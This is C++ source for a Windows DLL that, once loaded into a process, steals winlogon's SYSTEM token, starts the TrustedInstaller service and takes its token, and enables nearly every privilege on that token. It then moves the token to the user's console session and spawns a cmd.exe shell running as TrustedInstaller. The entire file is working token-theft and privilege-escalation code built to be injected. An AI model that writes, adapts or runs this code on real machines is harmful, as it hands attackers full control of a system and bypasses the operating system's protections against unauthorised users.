#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS

#include <windows.h>
#include <wtsapi32.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <codecvt>
#include <TlHelp32.h>

#pragma comment(lib,"wtsapi32.lib")
using namespace std;

void OutputDebugPrintf(const char* strOutputString, ...)
{
    char strBuffer[4096] = { 0 };
    va_list vlArgs;
    va_start(vlArgs, strOutputString);
    _vsnprintf(strBuffer, sizeof(strBuffer) - 1, strOutputString, vlArgs);
    va_end(vlArgs);
    OutputDebugStringA((string("[Session0DLL] ")+strBuffer).c_str());
}
#define ODP OutputDebugPrintf
#define DS(x) ODP((x).c_str())

typedef DWORD(WINAPI* _CreateProcessInternal)(
    HANDLE hToken,
    LPCTSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation,
    DWORD unknown2
    );

DWORD GetProcessIdByName(wstring processName)
{
	HANDLE hSnapshot;
	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
	{
		DS("CreateToolhelp32Snapshot failed: " + to_string(GetLastError()));
	}

	DWORD pid = -1;
	PROCESSENTRY32W pe;
	ZeroMemory(&pe, sizeof(PROCESSENTRY32W));
	pe.dwSize = sizeof(PROCESSENTRY32W);
	if (Process32FirstW(hSnapshot, &pe))
	{
		while (Process32NextW(hSnapshot, &pe))
		{
			if (pe.szExeFile == processName)
			{
				pid = pe.th32ProcessID;
				break;
			}
		}
	}
	else
	{
		CloseHandle(hSnapshot);
		DS("Process32First failed: " + to_string(GetLastError()));
	}

	if (pid == -1)
	{
		CloseHandle(hSnapshot);
		DS("process not found: " + wstring_convert<codecvt_utf8<wchar_t>>().to_bytes(processName));
	}

	CloseHandle(hSnapshot);
	return pid;
}

void ImpersonateSystem()
{
	auto systemPid = GetProcessIdByName(L"winlogon.exe");
	HANDLE hSystemProcess;
	if ((hSystemProcess = OpenProcess(
		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
		FALSE,
		systemPid)) == nullptr)
	{
		DS("OpenProcess failed (winlogon.exe): " + to_string(GetLastError()));
	}

	HANDLE hSystemToken;
	if (!OpenProcessToken(
		hSystemProcess,
		MAXIMUM_ALLOWED,
		&hSystemToken))
	{
		CloseHandle(hSystemProcess);
		DS("OpenProcessToken failed (winlogon.exe): " + to_string(GetLastError()));
	}

	HANDLE hDupToken;
	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = nullptr;
	tokenAttributes.bInheritHandle = FALSE;
	if (!DuplicateTokenEx(
		hSystemToken,
		MAXIMUM_ALLOWED,
		&tokenAttributes,
		SecurityImpersonation,
		TokenImpersonation,
		&hDupToken))
	{
		CloseHandle(hSystemToken);
		DS("DuplicateTokenEx failed (winlogon.exe): " + to_string(GetLastError()));
	}
	if (!ImpersonateLoggedOnUser(hDupToken))
	{
		CloseHandle(hDupToken);
		CloseHandle(hSystemToken);
		DS("ImpersonateLoggedOnUser failed: " + to_string(GetLastError()));
	}

	CloseHandle(hDupToken);
	CloseHandle(hSystemToken);
}

int StartTrustedInstallerService()
{
	SC_HANDLE hSCManager;
	if ((hSCManager = OpenSCManagerW(
		nullptr,
		SERVICES_ACTIVE_DATABASE,
		GENERIC_EXECUTE)) == nullptr)
	{
		DS("OpenSCManager failed: " + to_string(GetLastError()));
	}

	SC_HANDLE hService;
	if ((hService = OpenServiceW(
		hSCManager,
		L"TrustedInstaller",
		GENERIC_READ | GENERIC_EXECUTE)) == nullptr)
	{
		CloseServiceHandle(hSCManager);
		DS("OpenService failed: " + to_string(GetLastError()));
	}

	SERVICE_STATUS_PROCESS statusBuffer;
	DWORD bytesNeeded;
	while (QueryServiceStatusEx(
		hService,
		SC_STATUS_PROCESS_INFO,
		reinterpret_cast<LPBYTE>(&statusBuffer),
		sizeof(SERVICE_STATUS_PROCESS),
		&bytesNeeded))
	{
		if (statusBuffer.dwCurrentState == SERVICE_STOPPED)
		{
			if (!StartServiceW(hService, 0, nullptr))
			{
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCManager);
				DS("StartService failed: " + to_string(GetLastError()));
			}
		}
		if (statusBuffer.dwCurrentState == SERVICE_START_PENDING ||
			statusBuffer.dwCurrentState == SERVICE_STOP_PENDING)
		{
			Sleep(statusBuffer.dwWaitHint);
			continue;
		}
		if (statusBuffer.dwCurrentState == SERVICE_RUNNING)
		{
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);
			return statusBuffer.dwProcessId;
		}
	}
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	DS("QueryServiceStatusEx failed: " + to_string(GetLastError()));
}
void EnablePrivilegeWithToken(HANDLE& hToken, wstring privilegeName)
{
	LUID luid;
	if (!LookupPrivilegeValueW(nullptr, privilegeName.c_str(), &luid))
	{
		string errstr = "LookupPrivilegeValue failed: " + to_string(GetLastError());
		ODP("%s, %ls\n", errstr.c_str(), privilegeName.c_str());
		return;
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		DS("AdjustTokenPrivilege failed(Priv not found): " + to_string(GetLastError()));
	}

}

void EnableAllPrivileges(HANDLE& hToken)
{
	const wchar_t* allowPriv[] = {
	SE_DEBUG_NAME ,SE_TCB_NAME ,SE_ASSIGNPRIMARYTOKEN_NAME ,SE_IMPERSONATE_NAME,
	SE_CREATE_TOKEN_NAME, SE_LOCK_MEMORY_NAME,SE_SECURITY_NAME,SE_TAKE_OWNERSHIP_NAME,
	SE_INCREASE_QUOTA_NAME, SE_UNSOLICITED_INPUT_NAME, SE_MACHINE_ACCOUNT_NAME,
	SE_LOAD_DRIVER_NAME, SE_SYSTEM_PROFILE_NAME,SE_SYSTEMTIME_NAME,
	SE_PROF_SINGLE_PROCESS_NAME, SE_INC_BASE_PRIORITY_NAME,
	SE_CREATE_PAGEFILE_NAME, SE_CREATE_PERMANENT_NAME, SE_BACKUP_NAME,
	SE_RESTORE_NAME, SE_SHUTDOWN_NAME, SE_AUDIT_NAME, SE_SYSTEM_ENVIRONMENT_NAME,
	SE_CHANGE_NOTIFY_NAME, SE_REMOTE_SHUTDOWN_NAME, SE_UNDOCK_NAME,
	SE_SYNC_AGENT_NAME, SE_ENABLE_DELEGATION_NAME, SE_MANAGE_VOLUME_NAME,
	SE_CREATE_GLOBAL_NAME, SE_TRUSTED_CREDMAN_ACCESS_NAME,
	SE_RELABEL_NAME, SE_INC_WORKING_SET_NAME, SE_TIME_ZONE_NAME,
	SE_CREATE_SYMBOLIC_LINK_NAME, SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
	};

	for (auto i : allowPriv)
	{
		EnablePrivilegeWithToken(hToken, i);
	}
}

DWORD WINAPI OnDllAttach(PVOID base) {
	for (int i = 0; i<20; i++)
		RevertToSelf(); // clean

	ImpersonateSystem();

	auto pid = StartTrustedInstallerService();

	HANDLE hTIProcess;
	if ((hTIProcess = OpenProcess(
		PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
		FALSE,
		pid)) == nullptr)
	{
		DS("OpenProcess failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}

	HANDLE hTIToken;
	if (!OpenProcessToken(
		hTIProcess,
		MAXIMUM_ALLOWED,
		&hTIToken))
	{
		CloseHandle(hTIProcess);
		DS("OpenProcessToken failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}

	HANDLE hDupToken;
	SECURITY_ATTRIBUTES tokenAttributes;
	tokenAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	tokenAttributes.lpSecurityDescriptor = nullptr;
	tokenAttributes.bInheritHandle = FALSE;
	if (!DuplicateTokenEx(
		hTIToken,
		TOKEN_ALL_ACCESS,
		&tokenAttributes,
		SecurityImpersonation,
		TokenImpersonation,
		&hDupToken))
	{
		CloseHandle(hTIToken);
		DS("DuplicateTokenEx failed (TrustedInstaller.exe): " + to_string(GetLastError()));
	}
	EnableAllPrivileges(hDupToken);

	DWORD session = WTSGetActiveConsoleSessionId();
	if (!SetTokenInformation(hDupToken, TokenSessionId, &session, sizeof(session)))
	{
		ODP("change to session1 err");
	}

	ODP("Spwan shell in session1");
	STARTUPINFOW startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
	startupInfo.lpDesktop = (LPWSTR)L"Winsta0\\Default";

	PROCESS_INFORMATION processInfo;
	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessAsUserW(hDupToken,
		L"c:\\windows\\system32\\cmd.exe",
		nullptr,
		nullptr,
		FALSE,
		CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS,
		0,
		nullptr,
		nullptr,
		&startupInfo,
		&processInfo)) 
	{
		DS("CreateProcessAsUserW failed: " + to_string(GetLastError()));
	}

	//if (!CreateProcessWithTokenW(
	//	hDupToken,
	//	LOGON_WITH_PROFILE,
	//	nullptr,
	//	const_cast<LPWSTR>(L"cmd.exe"),
	//	CREATE_UNICODE_ENVIRONMENT,
	//	nullptr,
	//	nullptr,
	//	&startupInfo,
	//	&processInfo))
	//{
	//	DS("CreateProcessWithTokenW failed: " + to_string(GetLastError()));
	//}

    FreeLibraryAndExitThread(static_cast<HMODULE>(base), 0);
    return 0;
}
DWORD WINAPI OnDllDetach() {

    return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CloseHandle(CreateThread(0, 0, OnDllAttach, hModule, 0, 0));
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        OnDllDetach();
    }
    return TRUE;
}
